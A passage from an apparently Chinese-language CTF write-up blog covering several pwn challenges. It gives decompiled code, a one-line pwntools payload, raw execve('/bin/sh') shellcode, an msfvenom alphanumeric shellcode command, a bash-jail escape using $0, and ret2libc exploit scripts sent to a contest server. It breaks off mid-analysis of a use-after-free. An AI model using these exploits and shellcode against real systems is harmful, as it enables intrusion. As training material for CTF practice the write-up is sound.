&amp;v5);</span><br><span class="line">  <span class="keyword">while</span> ( v5 &gt; <span class="number">63</span> || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"sorry,your username is too LOOOOOOOOONG~~\nplease input again.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">    <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      ;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"whats your username?"</span>);</span><br><span class="line">  read_n(&amp;s1, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"admin"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v3);</span><br><span class="line">    v8 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello admin, please input the key: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%u"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"noooo, you are not the TRUE admin!!!\nwho are you???"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s, here is what I want to tell you:"</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_8048BF4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>虽然限制了username长度，可以输入负数直接绕过，然后输入一大堆’1’，将v10覆盖了就OK。</p><h3 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h3><p>神经病题目~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = fopen(<span class="string">"ad"</span>, <span class="string">"r"</span>);</span><br><span class="line">v1 = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">__isoc99_fscanf(v0, <span class="string">"%s"</span>, &amp;ad);</span><br><span class="line"><span class="keyword">return</span> __isoc99_fscanf(v1, <span class="string">"%s"</span>, &amp;flag);</span><br></pre></td></tr></table></figure></p><p>广告词和flag都读到bss段了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s = (<span class="keyword">char</span> *)&amp;ad;</span><br><span class="line">v3 = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, v3);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  getinput((<span class="keyword">int</span>)&amp;s1, <span class="number">188</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"fuck it"</span>) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"me too! again!!!\n"</span>);</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"that's not right :(\n"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>只要将s覆盖成flag的地址就可以，不用计算距离，直接干！payload：<code>python -c &quot;from pwn import *;print 100*p32(0x0804A060)&quot; |nc 111.230.149.72 10003</code></p><h3 id="zazahui-ver2"><a href="#zazahui-ver2" class="headerlink" title="zazahui_ver2"></a>zazahui_ver2</h3><p>打印广告词的代码移到while外了，不会每轮都打印广告，思路是照样覆盖s为flag地址，在strcmp那里做爆破，由于flag是0x00结尾，我们可以输入0x00，然后flag地址不停+1，直到提示right爆破出长度，然后再从后往前逐位爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./zazahui_ver2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">flaglen = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">  payload = <span class="number">176</span> * <span class="string">'\x00'</span></span><br><span class="line">  payload += p32(<span class="number">0x804a060</span> + i)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  res = p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'again'</span> <span class="keyword">in</span> res:</span><br><span class="line">    flaglen = i</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'flaglen: '</span>, flaglen</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(flaglen):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    payload = chr(j) + flag</span><br><span class="line">    payload = payload.ljust(<span class="number">176</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p32(<span class="number">0x804a060</span> + flaglen - i <span class="number">-1</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    res = p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'again'</span> <span class="keyword">in</span> res:</span><br><span class="line">      flag = chr(j) + flag</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'flag:'</span>,flag</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><p>超简单的shellcode，直接干就行了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10004</span>)</span><br><span class="line">payload = <span class="string">"\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="ez-shellcode-ver2"><a href="#ez-shellcode-ver2" class="headerlink" title="ez_shellcode_ver2"></a>ez_shellcode_ver2</h3><p>一样是写shellcode，但是只能是大写字母和数字，可以用msfvenom生成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_upper BufferRegister=EAX -f python</span><br><span class="line">shellcode =  &quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJDKF8MI1BE62HVMSSMYM7E8VOSCCX302HFO2BU92NK9M3QBZHUXEPUPS0VOE2SY2NFO2S58C00WPSK9KQ8MMPAA&quot;</span><br></pre></td></tr></table></figure></p><h3 id="bash-jail"><a href="#bash-jail" class="headerlink" title="bash_jail"></a>bash_jail</h3><p>hint:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.目录结构:</span><br><span class="line">/# ls -l</span><br><span class="line">total 32</span><br><span class="line">-rwxr-x--- 1 root ctf 6352 Feb 13 04:26 bash_jail</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:28 bin</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:28 dev</span><br><span class="line">-rwxr----- 1 root ctf 38 Feb 13 04:26 flag</span><br><span class="line">drwxr-xr-x 27 root root 4096 Feb 13 04:27 lib</span><br><span class="line">drwxr-xr-x 3 root root 4096 Feb 13 04:27 lib32</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:27 lib64</span><br><span class="line"></span><br><span class="line">/bin# ls -l</span><br><span class="line">total 340</span><br><span class="line">-rwxr-xr-x 1 root root 52080 Feb 13 04:28 cat</span><br><span class="line">-rwxr-xr-x 1 root root 126584 Feb 13 04:28 ls</span><br><span class="line">-rwxr-xr-x 1 root root 154072 Feb 13 04:28 sh</span><br><span class="line"></span><br><span class="line">2.考虑下system源码?</span><br><span class="line">https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system</span><br><span class="line"></span><br><span class="line">3.学习一下shell的变量,正则等等?</span><br><span class="line">https://linux.die.net/man/1/bash</span><br><span class="line"></span><br><span class="line">4.如果正赛出这种题,大概是这样的:https://www.youtube.com/watch?v=6D1LnMj0Yt0</span><br></pre></td></tr></table></figure></p><p>伪代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  lineptr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===== easy bash jail ====="</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, v3);</span><br><span class="line">    v3 = &amp;n;</span><br><span class="line">    getline(&amp;lineptr, &amp;n, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400706(lineptr) ) <span class="comment">//过滤了一些关键字母 abcfhgilnst*</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"hacker!! go away~~ QAQ"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      system(lineptr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>方法一：考虑到system执行命令时<code>argv[0]</code>是sh(见源码),而<code>argv[0]</code>可以用<code>$0</code>这个变量来打印因此只要输入 <code>$0</code> 即可getshell.</p><p>方法二：可以用 <code>???/??? ????</code> ,<code>?</code>可以做通配符，根据提示<code>???/???</code>可以匹配到<code>/bin/cat</code></p><h3 id="hacker-system-ver1"><a href="#hacker-system-ver1" class="headerlink" title="hacker_system_ver1"></a>hacker_system_ver1</h3><p>程序提供了add，print和delete的功能<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80489BB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to hacker system ver1.0\n\n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">      v0 = read_int();</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      print_hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        del_hacker();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"bye."</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invaild command."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      <span class="keyword">if</span> ( add_hacker() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"add failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>print和delete都有简单的栈溢出可利用<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"searched by name, input name length:"</span>);</span><br><span class="line">  v2 = read_int();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input hacker's name:"</span>);</span><br><span class="line">  result = read_str((<span class="keyword">int</span>)&amp;s1, v2);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = hacker_list[i];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(hacker_list[i] + <span class="number">4</span>));</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        result = <span class="built_in">printf</span>(</span><br><span class="line">                   <span class="string">"id:%u, name:%s, age:%u, intro:%s\n"</span>,</span><br><span class="line">                   *(_DWORD *)hacker_list[i],</span><br><span class="line">                   hacker_list[i] + <span class="number">4</span>,</span><br><span class="line">                   *(_DWORD *)(hacker_list[i] + <span class="number">36</span>),</span><br><span class="line">                   *(_DWORD *)(hacker_list[i] + <span class="number">40</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span> , <span class="number">10005</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver1'</span> )</span><br><span class="line">libc = ELF(<span class="string">'./libc32.so'</span> )</span><br><span class="line"></span><br><span class="line">print_hacker_addr = <span class="number">0x8048a20</span></span><br><span class="line">junk = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload = junk + p32(elf.symbols[<span class="string">'puts'</span>]) + p32(print_hacker_addr) + p32(elf.got[<span class="string">'printf'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = junk + p32(system) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="hacker-system-ver2"><a href="#hacker-system-ver2" class="headerlink" title="hacker_system_ver2"></a>hacker_system_ver2</h3><p>同ver1，只是变成64位<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span> , <span class="number">10008</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver2'</span> )</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span> )</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x400fb3</span></span><br><span class="line">print_hacker_addr = <span class="number">0x400c63</span></span><br><span class="line">junk = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload = junk + p64(pr) + p64(elf.got[<span class="string">'read'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(print_hacker_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = junk + p64(pr) + p64(binsh) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="hacker-system-ver3"><a href="#hacker-system-ver3" class="headerlink" title="hacker_system_ver3"></a>hacker_system_ver3</h3><p>hacker资料结构体：（共0x38 byte）</p><table><thead><tr><th>内容</th><th>大小</th></tr></thead><tbody><tr><td>age</td><td>8 byte</td></tr><tr><td>name</td><td>32 byte</td></tr><tr><td>id</td><td>8 byte</td></tr><tr><td>intro addr</td><td>8 byte</td></tr></tbody></table><p>漏洞点很明显，在del那里，会删除同名的所有hacker资料，但是只情空了最后一个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">del_hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **ptr; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input hacker's name:"</span>);</span><br><span class="line">  read_str(&amp;s1, <span class="number">32L</span>L);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( list_table[i] &amp;&amp; !<span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(list_table[i] + <span class="number">8</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">      v2 = i;</span><br><span class="line">      ptr = (<span class="keyword">void</span> **)list_table[i];</span><br><span class="line">      <span class="built_in">free</span>(ptr[<span class="number">6</span>]);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    list_table[v2] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"delete hacker %s done!!\n"</span>, &amp;s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span 